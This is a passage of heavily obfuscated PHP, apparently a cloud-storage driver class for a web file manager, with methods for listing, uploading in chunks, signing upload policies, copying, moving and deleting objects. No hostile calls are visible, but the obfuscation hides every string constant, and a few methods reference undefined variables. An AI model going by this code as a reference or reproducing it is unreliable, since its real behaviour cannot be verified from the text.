$Ë’ü™•Œ[1721]); return isset($ñßÃš®[$¦¥à×—ú]) ? $ñßÃš®[$¦¥à×—ú] : $¦¥à×—ú; } public function mkfile($Í€í®ÍÔ, $°ò²ŒÌé = '', $õ²Üãƒ  = REPEAT_RENAME) { if ($this->setContent($Í€í®ÍÔ, $°ò²ŒÌé)) { return $this->getPathOuter($Í€í®ÍÔ); } return !1; } public function mkdir($”³µÖ›™, $“½–è¯ = REPEAT_SKIP) { $Š…­¤‰Ô =& $_SERVER[Ï×Œõ”û]; $ıÂŒ¬Æ¥ = trim($”³µÖ›™, $Š…­¤‰Ô[8]); if ($this->_isFolder($ıÂŒ¬Æ¥)) { return $this->getPathOuter($ıÂŒ¬Æ¥); } $À¤ æ = array($Š…­¤‰Ô[1722]); $ĞÈŞƒš = $this->ussRequest($ıÂŒ¬Æ¥, $Š…­¤‰Ô[290], !1, $À¤ æ); return $ĞÈŞƒš[$Š…­¤‰Ô[1354]] ? $this->getPathOuter($ıÂŒ¬Æ¥) : !1; } public function copyFile($Ñî¿ñ», $®¬™Ü¡›) { $÷Ô‘®ºÍ =& $_SERVER[Ï×Œõ”û]; $Ğ‘ÒÓœ’ = array($÷Ô‘®ºÍ[1723] . "\57{$this->bucket}\57{$Ñî¿ñ»}", $÷Ô‘®ºÍ[1724]); $¼’Ëìİ = $this->ussRequest($®¬™Ü¡›, $÷Ô‘®ºÍ[255], !1, $Ğ‘ÒÓœ’); return $¼’Ëìİ[$÷Ô‘®ºÍ[1354]] ? !0 : $this->getPathOuter($®¬™Ü¡›); } public function moveFile($êÁô©Ø, $œ‚ìñÌ®) { $Ïß„åÓ =& $_SERVER[Ï×Œõ”û]; $•¡³›ÙÍ = array($Ïß„åÓ[1725] . "\x2f{$this->bucket}\57{$êÁô©Ø}", $Ïß„åÓ[1724]); $¤øüµæË = $this->ussRequest($œ‚ìñÌ®, $Ïß„åÓ[255], !1, $•¡³›ÙÍ); return $¤øüµæË[$Ïß„åÓ[1354]] ? !0 : $this->getPathOuter($œ‚ìñÌ®); } public function delFile($ û¥Ïì—) { $¤Õª‹›û =& $_SERVER[Ï×Œõ”û]; $İÕöáú = $this->ussRequest($ û¥Ïì—, $¤Õª‹›û[1726]); return $İÕöáú[$¤Õª‹›û[1354]] ? !0 : !1; } public function delFolder($ıÀ’ÆĞœ) { $ËÆ»í“ =& $_SERVER[Ï×Œõ”û]; if (!$this->exist($ıÀ’ÆĞœ)) { return !0; } $this->listItemCache = !1; $À×¸éœ = $¿ı”¸ûÅ = array(); $this->fileList($ıÀ’ÆĞœ, $À×¸éœ, $¿ı”¸ûÅ, !0); $this->listItemCache = !0; foreach ($¿ı”¸ûÅ as $˜Ëğ«¶á) { $åÓ×ÅÈ´ = $this->ussRequest($˜Ëğ«¶á[$ËÆ»í“[32]], $ËÆ»í“[1726]); if (!$åÓ×ÅÈ´[$ËÆ»í“[1354]]) { return !1; } } usort($À×¸éœ, function ($éÛ’şË›, $ Š×ÃÉ) { $èë™²Çì =& $_SERVER[Ï×Œõ”û]; return substr_count($ Š×ÃÉ, $èë™²Çì[8]) - substr_count($éÛ’şË›, $èë™²Çì[8]); }); foreach ($À×¸éœ as $áğ€Ë‹) { $åÓ×ÅÈ´ = $this->ussRequest($áğ€Ë‹, $ËÆ»í“[1726]); if (!$åÓ×ÅÈ´[$ËÆ»í“[1354]]) { return !1; } } $åÓ×ÅÈ´ = $this->ussRequest($ıÀ’ÆĞœ, $ËÆ»í“[1726]); return $åÓ×ÅÈ´[$ËÆ»í“[1354]]; } public function rename($€»÷¤ÁŒ, $·²œèÌ¯) { if ($this->isFile($€»÷¤ÁŒ)) { $·²œèÌ¯ = get_path_father($€»÷¤ÁŒ) . $·²œèÌ¯; return $this->moveFile($€»÷¤ÁŒ, $·²œèÌ¯); } return $this->renameObject($€»÷¤ÁŒ, $·²œèÌ¯); } public function fileInfo($ùá¬²äí, $¤·æ¢¤Ö = false, $ê¡ÃÀ¢¼ = array()) { $ÃÅÏ‘½Ü =& $_SERVER[Ï×Œõ”û]; $Šéñáè„ = array($ÃÅÏ‘½Ü[32] => $this->pathThis($ùá¬²äí), $ÃÅÏ‘½Ü[87] => $this->getPathOuter($ÃÅÏ‘½Ü[8] . $ùá¬²äí), $ÃÅÏ‘½Ü[33] => $ÃÅÏ‘½Ü[232], $ÃÅÏ‘½Ü[79] => isset($ê¡ÃÀ¢¼[$ÃÅÏ‘½Ü[79]]) ? $ê¡ÃÀ¢¼[$ÃÅÏ‘½Ü[79]] : 0, $ÃÅÏ‘½Ü[168] => $this->ext($ùá¬²äí)); if ($¤·æ¢¤Ö) { return $Šéñáè„; } $Šéñáè„[$ÃÅÏ‘½Ü[233]] = $Šéñáè„[$ÃÅÏ‘½Ü[88]] = 0; $Šéñáè„[$ÃÅÏ‘½Ü[234]] = $Šéñáè„[$ÃÅÏ‘½Ü[235]] = !0; if (empty($ê¡ÃÀ¢¼)) { $ê¡ÃÀ¢¼ = $this->objectMeta($ùá¬²äí); if (!$ê¡ÃÀ¢¼) { return $Šéñáè„; } } $Šéñáè„[$ÃÅÏ‘½Ü[233]] = intval($ê¡ÃÀ¢¼[$ÃÅÏ‘½Ü[1727]]); $Šéñáè„[$ÃÅÏ‘½Ü[88]] = intval($ê¡ÃÀ¢¼[$ÃÅÏ‘½Ü[1728]]); $Šéñáè„[$ÃÅÏ‘½Ü[79]] = $ê¡ÃÀ¢¼[$ÃÅÏ‘½Ü[79]]; return $Šéñáè„; } public function folderInfo($åÁ¶­¾Ø, $Á²¯•öé = false) { $”ĞĞ”íô =& $_SERVER[Ï×Œõ”û]; $ÔÓúõÀ… = array($”ĞĞ”íô[32] => $this->pathThis($åÁ¶­¾Ø), $”ĞĞ”íô[87] => $this->getPathOuter($”ĞĞ”íô[8] . $åÁ¶­¾Ø), $”ĞĞ”íô[33] => $”ĞĞ”íô[78]); if ($Á²¯•öé) { return $ÔÓúõÀ…; } $ÔÓúõÀ…[$”ĞĞ”íô[233]] = $ÔÓúõÀ…[$”ĞĞ”íô[88]] = 0; $ÔÓúõÀ…[$”ĞĞ”íô[234]] = $ÔÓúõÀ…[$”ĞĞ”íô[235]] = !0; if (empty($Ï•ÒÆ††)) { $Ï•ÒÆ†† = $this->objectMeta($åÁ¶­¾Ø); if (!$Ï•ÒÆ††) { return $ÔÓúõÀ…; } } $ÔÓúõÀ…[$”ĞĞ”íô[233]] = intval($Ï•ÒÆ††[$”ĞĞ”íô[1727]]); $ÔÓúõÀ…[$”ĞĞ”íô[88]] = intval($Ï•ÒÆ††[$”ĞĞ”íô[1728]]); return $ÔÓúõÀ…; } private function listObjs($„ûŞİ¹„, $•¡Ã¿Õ­ = 0, $„Áûüêª = 1000) { $ÍØÄ£ŒË =& $_SERVER[Ï×Œõ”û]; $Ğ€„ìÓÆ = array($ÍØÄ£ŒË[1729], $ÍØÄ£ŒË[1730] . $„Áûüêª); if ($•¡Ã¿Õ­) { $Ğ€„ìÓÆ[] = $ÍØÄ£ŒË[1731] . $•¡Ã¿Õ­; } $›ÂÑ¦¾¼ = $this->ussRequest($„ûŞİ¹„, $ÍØÄ£ŒË[1560], !1, $Ğ€„ìÓÆ); return !$›ÂÑ¦¾¼[$ÍØÄ£ŒË[1354]] ? !1 : $›ÂÑ¦¾¼[$ÍØÄ£ŒË[1344]]; } private function fileList($¢¥ÉŠêÎ, &$·Òò‘¬¤, &$¯Ë„±£, $‚ÍÕú‘ = false) { $„şñ˜³ó =& $_SERVER[Ï×Œõ”û]; $şòæèù = $„şñ˜³ó[12]; $ß‰ÌÇåü = 1000; $Ã²ÙÃõ× = rtrim($¢¥ÉŠêÎ, $„şñ˜³ó[8]) . $„şñ˜³ó[8]; while (!0) { check_abort(); $‘Õö´Ë¿ = $this->listObjs($¢¥ÉŠêÎ, $şòæèù, $ß‰ÌÇåü); if (!$‘Õö´Ë¿) { return !1; } $şòæèù = isset($‘Õö´Ë¿[$„şñ˜³ó[1732]]) ? $‘Õö´Ë¿[$„şñ˜³ó[1732]] : $„şñ˜³ó[12]; $²ÑáıšÂ = isset($‘Õö´Ë¿[$„şñ˜³ó[1733]]) ? $‘Õö´Ë¿[$„şñ˜³ó[1733]] : array(); foreach ($²ÑáıšÂ as $­Œ¥öÔ×) { $à¢ÍÍŞ = $­Œ¥öÔ×[$„şñ˜³ó[33]] == $„şñ˜³ó[78] ? !0 : !1; $Š™Ü±† = ltrim($Ã²ÙÃõ× . $­Œ¥öÔ×[$„şñ˜³ó[32]], $„şñ˜³ó[8]) . ($à¢ÍÍŞ ? $„şñ˜³ó[8] : $„şñ˜³ó[12]); $™ íàìÕ = array($„şñ˜³ó[32] => $Š™Ü±†, $„şñ˜³ó[33] => $à¢ÍÍŞ ? $„şñ˜³ó[78] : $„şñ˜³ó[232], $„şñ˜³ó[79] => $­Œ¥öÔ×[$„şñ˜³ó[414]], $„şñ˜³ó[1728] => $­Œ¥öÔ×[$„şñ˜³ó[1734]]); $this->cacheMethodInfoSet($Š™Ü±†, $à¢ÍÍŞ, $™ íàìÕ); if ($à¢ÍÍŞ) { $·Òò‘¬¤[] = $Š™Ü±†; if ($‚ÍÕú‘) { $this->fileList($Š™Ü±†, $·Òò‘¬¤, $¯Ë„±£, $‚ÍÕú‘); } continue; } $¯Ë„±£[] = $™ íàìÕ; } if (count($²ÑáıšÂ) < $ß‰ÌÇåü) { break; } } $this->cacheMethodInfoSet($¢¥ÉŠêÎ, !0); } public function listPath($¸‡à¡, $¶øÎ–½â = false) { $¾”ê·¶Ó =& $_SERVER[Ï×Œõ”û]; $’ÈÅùıí = $ú‹Òø¢š = array(); $this->fileList($¸‡à¡, $’ÈÅùıí, $ú‹Òø¢š); foreach ($’ÈÅùıí as $ÒÊŠ›© => $ˆÚÖšóû) { $’ÈÅùıí[$ÒÊŠ›©] = $this->folderInfo($ˆÚÖšóû, $¶øÎ–½â); } foreach ($ú‹Òø¢š as $ÒÊŠ›© => $ˆÚÖšóû) { $ú‹Òø¢š[$ÒÊŠ›©] = $this->fileInfo($ˆÚÖšóû[$¾”ê·¶Ó[32]], $¶øÎ–½â, $ˆÚÖšóû); } return array($¾”ê·¶Ó[85] => $’ÈÅùıí, $¾”ê·¶Ó[86] => $ú‹Òø¢š); } public function has($ø‚€¢›ô, $Ÿñßù“ = false, $èĞƒè¡® = true) { $¥ï¯÷ =& $_SERVER[Ï×Œõ”û]; $±ÃãúÕ´ = $¥ï¯÷[12]; $òé¹¹ = 500; $•˜ƒ¸²¦ = 0; $œóê üÖ = 0; $è†Ç½‡½ = rtrim($ø‚€¢›ô, $¥ï¯÷[8]) . $¥ï¯÷[8]; while (!0) { check_abort(); $¯Ç‰úö = $this->listObjs($ø‚€¢›ô, $±ÃãúÕ´, $òé¹¹); if (!$¯Ç‰úö) { return !1; } $±ÃãúÕ´ = isset($¯Ç‰úö[$¥ï¯÷[1732]]) ? $¯Ç‰úö[$¥ï¯÷[1732]] : $¥ï¯÷[12]; $¬í‘‚¹ˆ = isset($¯Ç‰úö[$¥ï¯÷[1733]]) ? $¯Ç‰úö[$¥ï¯÷[1733]] : array(); if (empty($¬í‘‚¹ˆ)) { break; } $ª”è¡ßå = array_filter($¬í‘‚¹ˆ, function ($òÒÌ©ïú) { $ëõ·úõö =& $_SERVER[Ï×Œõ”û]; return $òÒÌ©ïú[$ëõ·úõö[33]] == $ëõ·úõö[78]; }); $ñ°öü™¸ = count($¬í‘‚¹ˆ); $ª”è¡ßå = count($ª”è¡ßå); $«Ãè¬Ã¿ = $ñ°öü™¸ - $ª”è¡ßå; if ($Ÿñßù“) { $œóê üÖ += $ª”è¡ßå; $•˜ƒ¸²¦ += $«Ãè¬Ã¿; if ($ñ°öü™¸ < $òé¹¹) { break; } continue; } if ($èĞƒè¡®) { if ($«Ãè¬Ã¿) { return !0; } } else { if ($ª”è¡ßå) { return !0; } } if ($ñ°öü™¸ < $òé¹¹) { break; } } if ($Ÿñßù“) { return array($¥ï¯÷[241] => $•˜ƒ¸²¦, $¥ï¯÷[242] => $œóê üÖ); } return !1; } public function listAll($Á‡¸Åğà) { $ÌÉõß†‘ =& $_SERVER[Ï×Œõ”û]; $ÀŒò·¬¤ = $ÖìôÂ = array(); $this->fileList($Á‡¸Åğà, $ÀŒò·¬¤, $ÖìôÂ, !0); $ı›¾¿”ü = array_to_keyvalue($ÖìôÂ, $ÌÉõß†‘[32]); foreach ($ÀŒò·¬¤ as $ªºâãå†) { if (is_string($ªºâãå†)) { $ı›¾¿”ü[$ªºâãå†] = array($ÌÉõß†‘[79] => 0); } } return $this->listAllFiles($Á‡¸Åğà, $ı›¾¿”ü); } public function canRead($õ¢¦Ì‰) { return $this->exist($õ¢¦Ì‰) ? !0 : !1; } public function canWrite($Ÿ¶Ãç×­) { return $this->exist($Ÿ¶Ãç×­) ? !0 : !1; } public function getContent($‡œ‡¸í¤) { return $this->fileSubstr($‡œ‡¸í¤, 0, -1); } public function setContent($™Ã‹º, $÷é¾íæŞ = '') { $³À‡ô¥Ó =& $_SERVER[Ï×Œõ”û]; if (!$÷é¾íæŞ) { $‰Ú™Ê­ = $this->ussRequest($™Ã‹º, $³À‡ô¥Ó[290]); return $‰Ú™Ê­[$³À‡ô¥Ó[1354]]; } $úş™Í‹È = $this->tempFile($this->pathThis($™Ã‹º)); file_put_contents($úş™Í‹È, $÷é¾íæŞ); if ($this->upload($™Ã‹º, $úş™Í‹È)) { $this->tempFileRemve($úş™Í‹È); return !0; } return !1; } public function fileSubstr($±Ñ÷¿İû, $ºÚ€şÌÆ, $Ì‹ÎÙ®¶) { $ªÍ¼şÂä =& $_SERVER[Ï×Œõ”û]; if (!($§ÀòÑÛÙ = $this->link($±Ñ÷¿İû))) { return !1; } $ıĞ¤ÓÉŸ = !1; if ($Ì‹ÎÙ®¶ > 0) { $¹ÑÑá­Î = $ºÚ€şÌÆ + $Ì‹ÎÙ®¶ - 1; $ıĞ¤ÓÉŸ = array($ªÍ¼şÂä[1559] . $ºÚ€şÌÆ . $ªÍ¼şÂä[474] . $¹ÑÑá­Î); } $Çö®îÈ = url_request($§ÀòÑÛÙ, $ªÍ¼şÂä[1560], !1, $ıĞ¤ÓÉŸ); return $Çö®îÈ[$ªÍ¼şÂä[856]] ? $Çö®îÈ[$ªÍ¼şÂä[1344]] : !1; } public function upload($â¯×°ßâ, $”é·¶œ˜, $ô””†‘ = false, $•€ÀÓÁ = REPEAT_REPLACE) { $Œš¿¤‰ö =& $_SERVER[Ï×Œõ”û]; if (!$”é·¶œ˜ || !@file_exists($”é·¶œ˜)) { return !1; } $»ˆú«¿ = IO::size($”é·¶œ˜); if ($»ˆú«¿ <= 1024 * 1024 * 200) { $çÇ®¡ÊÕ = array($Œš¿¤‰ö[1735] . $”é·¶œ˜); $ƒ½Ş‘¡ = $this->ussRequest($â¯×°ßâ, $Œš¿¤‰ö[255], $çÇ®¡ÊÕ); return $ƒ½Ş‘¡[$Œš¿¤‰ö[1354]] ? $this->getPathOuter($â¯×°ßâ) : !1; } $–ûœŞÜÓ = 1024 * 1024 * 10; $¢–Ç˜ÍÒ = array($Œš¿¤‰ö[1736], $Œš¿¤‰ö[1737] . $»ˆú«¿, $Œš¿¤‰ö[1738], $Œš¿¤‰ö[1739] . $–ûœŞÜÓ); $ƒ½Ş‘¡ = $this->ussRequest($â¯×°ßâ, $Œš¿¤‰ö[255], !1, $¢–Ç˜ÍÒ); if (!$ƒ½Ş‘¡[$Œš¿¤‰ö[1354]]) { return !1; } $Øô»äÆ½ = $ƒ½Ş‘¡[$Œš¿¤‰ö[1344]]; $ÖÒ± ‰ = 0; $ƒóû®¢İ = $Øô»äÆ½[$Œš¿¤‰ö[1740]]; $ş’öƒ°â = fopen($”é·¶œ˜, $Œš¿¤‰ö[1620]); if (!$ş’öƒ°â) { return !1; } do { $«ÙŞâŠ = $Øô»äÆ½[$Œš¿¤‰ö[1741]]; fseek_64($ş’öƒ°â, $ÖÒ± ‰); $å¿¤ñ¯£ = fread($ş’öƒ°â, $«ÙŞâŠ); $è™¨‚ŞÛ = 0; do { $è™¨‚ŞÛ++; $Øô»äÆ½ = $this->uploadPart($â¯×°ßâ, $Øô»äÆ½, $å¿¤ñ¯£); } while (!$Øô»äÆ½ && $è™¨‚ŞÛ < 3); if (!$Øô»äÆ½) { return !1; } $ƒóû®¢İ = $Øô»äÆ½[$Œš¿¤‰ö[1740]]; $ÖÒ± ‰ += $«ÙŞâŠ; } while ($ƒóû®¢İ != -1); fclose($ş’öƒ°â); $¢–Ç˜ÍÒ = array($Œš¿¤‰ö[1742], $Œš¿¤‰ö[1743] . $Øô»äÆ½[$Œš¿¤‰ö[1744]], $Œš¿¤‰ö[1738]); $ƒ½Ş‘¡ = $this->ussRequest($â¯×°ßâ, $Œš¿¤‰ö[255], !1, $¢–Ç˜ÍÒ); return $ƒ½Ş‘¡[$Œš¿¤‰ö[1354]] ? $this->getPathOuter($“­ª½) : !1; } private function uploadPart($Ğş©¯Æ, $¬ªçì¢“, &$˜¸È†„Ğ) { $Ÿúí¾Ò£ =& $_SERVER[Ï×Œõ”û]; $ŸÔÓûÙü = array($Ÿúí¾Ò£[1745], $Ÿúí¾Ò£[1743] . $¬ªçì¢“[$Ÿúí¾Ò£[1744]], $Ÿúí¾Ò£[1746] . $¬ªçì¢“[$Ÿúí¾Ò£[1740]], $Ÿúí¾Ò£[145] . $¬ªçì¢“[$Ÿúí¾Ò£[1741]]); $ÇÚÔï»™ = $this->ussRequest($Ğş©¯Æ, $Ÿúí¾Ò£[255], $˜¸È†„Ğ, $ŸÔÓûÙü); return !$ÇÚÔï»™[$Ÿúí¾Ò£[1354]] ? $ÇÚÔï»™[$Ÿúí¾Ò£[1354]] : $ÇÚÔï»™[$Ÿúí¾Ò£[1344]]; } public function uploadFormData($¤Íêª»•, $œíˆÄÎá = 3600) { return $this->uploadPolicy($¤Íêª»•, $œíˆÄÎá); } public function uploadMultiData($æí¹äÍ, $‹Íœîƒ = 3600) { $ñÑÈ‚²à =& $_SERVER[Ï×Œõ”û]; $ä®ÌĞâ = (int) $GLOBALS[$ñÑÈ‚²à[7]][$ñÑÈ‚²à[79]]; return $this->uploadPolicy($æí¹äÍ, $‹Íœîƒ, $ä®ÌĞâ); } private function uploadPolicy($Ö•ÒÁá, $¹úŒ†«ç = 3600, $¨İ±êÎ = 0) { $‰É‰” =& $_SERVER[Ï×Œõ”û]; $œèÙ…ˆ´ = $‰É‰”[8] . $this->bucket; $Ñë³±– = gmdate($‰É‰”[1655]); $ûëİĞ² = array($‰É‰”[1747] => $this->bucket, $‰É‰”[1748] => $Ö•ÒÁá, $‰É‰”[1749] => time() + $¹úŒ†«ç, $‰É‰”[1750] => $Ñë³±–); if ($¨İ±êÎ) { $ûëİĞ²[$‰É‰”[1640]] = $¨İ±êÎ; } $–ø¥èš = base64_encode(json_encode($ûëİĞ²)); $…Ü€é¥û = base64_encode(hash_hmac($‰É‰”[1704], "\x50\117\x53\x54\x26{$œèÙ…ˆ´}\46{$Ñë³±–}\x26{$–ø¥èš}", md5("{$this->userpass}"), !0)); $¦“‚Ì®µ = array($‰É‰”[279] => $–ø¥èš, $‰É‰”[1751] => "\125\120\x59\125\x4e\40{$this->username}\72{$…Ü€é¥û}", $‰É‰”[208] => $this->endpoint . $œèÙ…ˆ´); return $¦“‚Ì®µ; } public function download($Ñ¯ÙåŸ², $­ŒºßÈ¡) { $¤Áø²¸ = IO::getPathInner(IO::mkfile($­ŒºßÈ¡)); if (!($ø‡¦Í = $this->link($Ñ¯ÙåŸ²))) { return !1; } $òÇÏñÖ = 0; $‡·Îƒò¸ = 1024 * 200; $ÈĞëşÚÙ = fopen($¤Áø²¸, $_SERVER[Ï×Œõ”û][1699]); while (!0) { $õıÒÊÙ = $this->fileSubstr($Ñ¯ÙåŸ², $òÇÏñÖ, $‡·Îƒò¸); if ($õıÒÊÙ === !1) { return !1; } fwrite($ÈĞëşÚÙ, $õıÒÊÙ); $òÇÏñÖ += $‡·Îƒò¸; if (strlen($õıÒÊÙ) < $‡·Îƒò¸) { break; } } fclose($ÈĞëşÚÙ); return $­ŒºßÈ¡; } public function link($Ç»©€Òû, $†¨ì”õ = array()) { $ˆùø ÷ú =& $_SERVER[Ï×Œõ”û]; $Ç»©€Òû = trim($Ç»©€Òû, $ˆùø ÷ú[8]); if (!empty($this->token)) { $ú‡ÙÏÀ© = strtotime(date($ˆùø ÷ú[1752])); $ó°ôùÀ“ = substr(md5($this->token . $ˆùø ÷ú[286] . $ú‡ÙÏÀ© . $ˆùø ÷ú[1753] . $Ç»©€Òû), 12, 8) . $ú‡ÙÏÀ©; $†¨ì”õ[] = $ˆùø ÷ú[1754] . $ó°ôùÀ“; } $ÃäÏ°±Ì = !empty($†¨ì”õ) ? $ˆùø ÷ú[76] . implode($ˆùø ÷ú[286], $†¨ì”õ) : $ˆùø ÷ú[12]; return $this->getHost() . $ˆùø ÷ú[8] . $this->pathEncode($Ç»©€Òû) . $ÃäÏ°±Ì; } public function fileOut($Ã—¥Ê”ø, $¬‰”Åğ° = false, $ïú¶ƒ’‘ = false, $ıÖ‡ÑÙù = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ã—¥Ê”ø, $¬‰”Åğ°, $ïú¶ƒ’‘, $ıÖ‡ÑÙù); } if (!$ïú¶ƒ’‘) { $ïú¶ƒ’‘ = $this->pathThis($Ã—¥Ê”ø); } $Ö×ö¦ò‡ = $¬‰”Åğ° ? array($_SERVER[Ï×Œõ”û][1755] . rawurlencode($ïú¶ƒ’‘)) : array(); $»İÉ‰¡Ä = $this->link($Ã—¥Ê”ø, $Ö×ö¦ò‡); $this->fileOutLink($»İÉ‰¡Ä); } public function fileOutServer($ÎåŞ¬¿Ğ, $‚¯—‚ò = false, $û„úí• = false, $ô¢“Ã¸¤ = '') { parent::fileOut($ÎåŞ¬¿Ğ, $‚¯—‚ò, $û„úí•, $ô¢“Ã¸¤); } public function fileOutImage($¶¢Ü¬ä , $Â ³Äì = 250) { $§ÕÌòÒš = $this->link($¶¢Ü¬ä  . $_SERVER[Ï×Œõ”û][1756] . $Â ³Äì); $this->fileOutLink($§ÕÌòÒš); } public function fileOutImageServer($™„¢˜, $ Â¡‘úÜ = 250) { parent::fileOutImage($™„¢˜, $ Â¡‘úÜ); } public function hashMd5($¥¢·™‚ä) { $„¡×Çãï =& $_SERVER[Ï×Œõ”û]; $ÁŒ€¿Ÿ = $this->_objectMeta($¥¢·™‚ä); return isset($ÁŒ€¿Ÿ[$„¡×Çãï[247]]) ? $ÁŒ€¿Ÿ[$„¡×Çãï[247]] : !1; } public function size($‹÷º¡ü) { $ÚıÓŞ¦Ü = $this->objectMeta($‹÷º¡ü); return $ÚıÓŞ¦Ü ? $ÚıÓŞ¦Ü[$_SERVER[Ï×Œõ”û][79]] : 0; } public function info($œ¥„–şÀ) { if ($this->isFolder($œ¥„–şÀ)) { return $this->folderInfo($œ¥„–şÀ); } else { if ($this->isFile($œ¥„–şÀ)) { return $this->fileInfo($œ¥„–şÀ); } } return !1; } public function exist($¨ÒÓÓû) { return $this->isFile($¨ÒÓÓû) || $this->isFolder($¨ÒÓÓû); } public function isFile($ÉÅŒ¯°ù) { return !$this->isFolder($ÉÅŒ¯°ù) && $this->objectMeta($ÉÅŒ¯°ù); } public function isFolder($½ÆË–»¨) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][179], $½ÆË–»¨); } protected function objectMeta($ŠÇ¤›ƒ›) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][181], $ŠÇ¤›ƒ›); } protected function _objectMeta($•‰´·˜è) { $½ËÙ‡Œ  =& $_SERVER[Ï×Œõ”û]; if ($•‰´·˜è == $½ËÙ‡Œ [12] || $•‰´·˜è == $½ËÙ‡Œ [8]) { return array(); } $äÑÈ¯ë = $this->ussRequest($•‰´·˜è, $½ËÙ‡Œ [1757]); if (!$äÑÈ¯ë[$½ËÙ‡Œ [1354]]) { return null; } $äı³İô = isset($äÑÈ¯ë[$½ËÙ‡Œ [1344]]) ? $äÑÈ¯ë[$½ËÙ‡Œ [1344]] : array(); if (!isset($äı³İô[$½ËÙ‡Œ [1758]])) { return null; } $¹°¢²Å = array($½ËÙ‡Œ [33] => isset($äı³İô[$½ËÙ‡Œ [1758]]) ? $äı³İô[$½ËÙ‡Œ [1758]] : null, $½ËÙ‡Œ [79] => isset($äı³İô[$½ËÙ‡Œ [1759]]) ? $äı³İô[$½ËÙ‡Œ [1759]] : null, $½ËÙ‡Œ [247] => isset($äı³İô[$½ËÙ‡Œ [1760]]) ? $äı³İô[$½ËÙ‡Œ [1760]] : null, $½ËÙ‡Œ [1727] => isset($äı³İô[$½ËÙ‡Œ [1761]]) ? $äı³İô[$½ËÙ‡Œ [1761]] : null); $¹°¢²Å[$½ËÙ‡Œ [1728]] = isset($äı³İô[$½ËÙ‡Œ [1762]]) ? strtotime($äı³İô[$½ËÙ‡Œ [1762]]) : $¹°¢²Å[$½ËÙ‡Œ [1727]]; return $¹°¢²Å; } protected function _isFolder($Ğè›Ü™Ğ) { $¯ä¿Ë‡ü =& $_SERVER[Ï×Œõ”û]; if ($Ğè›Ü™Ğ == $¯ä¿Ë‡ü[12] || $Ğè›Ü™Ğ == $¯ä¿Ë‡ü[8]) { return !0; } $¨ÍÊÁ¡‚ = $this->_objectMeta($Ğè›Ü™Ğ); return isset($¨ÍÊÁ¡‚[$¯ä¿Ë‡ü[33]]) && $¨ÍÊÁ¡‚[$¯ä¿Ë‡ü[33]] == $¯ä¿Ë‡ü[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ò¶ª·öû = false) { } public function exist($Şå¼Ş˜³) { $ßÉÙÜ ‰ = $this->info($Şå¼Ş˜³); return $ßÉÙÜ ‰[$_SERVER[Ï×Œõ”û][234]]; } public function isFile($‚»ú¥×) { $Á˜¬Êé = $this->info($‚»ú¥×); return $Á˜¬Êé[$_SERVER[Ï×Œõ”û][234]]; } public function isFolder($Ë„¼³á) { return !1; } public function size($ÇÀ®³úü) { $àå½ı = $this->info($ÇÀ®³úü); return $àå½ı[$_SERVER[Ï×Œõ”û][79]]; } public function info($™™ûƒÇœ) { return $this->infoParse($™™ûƒÇœ); } public function infoAuth($¤Ş•„Ó) { return $this->infoParse($¤Ş•„Ó); } public function infoWithChildren($ğè™§µ) { return $this->infoParse($ğè™§µ); } public function infoFull($‘¥©ÙÒ¶) { return $this->infoParse($‘¥©ÙÒ¶); } private function infoParse($Ş°šÀÙÁ) { $ÄäÎà¯ =& $_SERVER[Ï×Œõ”û]; $ò­ô¡«Ğ = $this->header($Ş°šÀÙÁ); if (!$ò­ô¡«Ğ || !$ò­ô¡«Ğ[$ÄäÎà¯[856]]) { return !1; } $ÅÜ€¯¤ñ = _get($ò­ô¡«Ğ, $ÄäÎà¯[414], 0); $™…©ŠÉ” = array($ÄäÎà¯[32] => $ò­ô¡«Ğ[$ÄäÎà¯[32]], $ÄäÎà¯[87] => $Ş°šÀÙÁ, $ÄäÎà¯[33] => $ÄäÎà¯[232], $ÄäÎà¯[79] => intval($ÅÜ€¯¤ñ), $ÄäÎà¯[168] => get_path_ext($ò­ô¡«Ğ[$ÄäÎà¯[32]]), $ÄäÎà¯[1617] => $ÅÜ€¯¤ñ > 0 && $ò­ô¡«Ğ[$ÄäÎà¯[1763]], $ÄäÎà¯[1618] => !1); return $™…©ŠÉ”; } private function header($¶ûÒé¡ª) { $ß…Ù÷ñŸ =& $_SERVER[Ï×Œõ”û]; if (isset(self::$_cacheHeader[$¶ûÒé¡ª])) { return self::$_cacheHeader[$¶ûÒé¡ª]; } $‘‘µÉ–â = isset($GLOBALS[$ß…Ù÷ñŸ[1764]]) ? $GLOBALS[$ß…Ù÷ñŸ[1764]] : !1; $GLOBALS[$ß…Ù÷ñŸ[1764]] = !0; self::$_cacheHeader[$¶ûÒé¡ª] = url_header($¶ûÒé¡ª); $GLOBALS[$ß…Ù÷ñŸ[1764]] = $‘‘µÉ–â; return self::$_cacheHeader[$¶ûÒé¡ª]; } public function hashSimple($”æ¥ÅıÕ, $·ççöÅë = false) { $Ã³˜Æ´© =& $_SERVER[Ï×Œõ”û]; $»ëøó”Ô = $this->info($”æ¥ÅıÕ); if (!$»ëøó”Ô || !$»ëøó”Ô[$Ã³˜Æ´©[234]]) { return !1; } $‹ÌË‰É = $»ëøó”Ô[$Ã³˜Æ´©[79]]; $¾‹œİÂ± = 200; $×›…ıŠ´ = 50; if ($‹ÌË‰É <= $¾‹œİÂ± * $×›…ıŠ´) { return md5($this->fileSubstr($”æ¥ÅıÕ, 0, $‹ÌË‰É)) . $‹ÌË‰É; } $ªƒ•ŸÊ = intval($‹ÌË‰É / $×›…ıŠ´); $‡¿©ëŸ“ = $Ã³˜Æ´©[12]; $–æäñØ’ = timeFloat(); $Æ˜×÷ÒÒ = 15; for ($õçîÒ‰Ş = 0; $õçîÒ‰Ş < $×›…ıŠ´; $õçîÒ‰Ş++) { if (timeFloat() - $–æäñØ’ > $Æ˜×÷ÒÒ) { return !1; } $é®ˆ®Àó = $this->fileSubstr($”æ¥ÅıÕ, $ªƒ•ŸÊ * $õçîÒ‰Ş, $¾‹œİÂ±); if (!$é®ˆ®Àó) { return !1; } $‡¿©ëŸ“ .= $é®ˆ®Àó; } $‡¿©ëŸ“ .= $this->fileSubstr($”æ¥ÅıÕ, $‹ÌË‰É - $¾‹œİÂ±, $¾‹œİÂ±); return md5($‡¿©ëŸ“) . $‹ÌË‰É; } public function getContent($àÕÈÉÀ) { return $this->fileSubstr($àÕÈÉÀ); } public function fileSubstr($ÂîƒÎ¦é, $Óâ†ş†í = 0, $¯À©Û‡ = -1) { 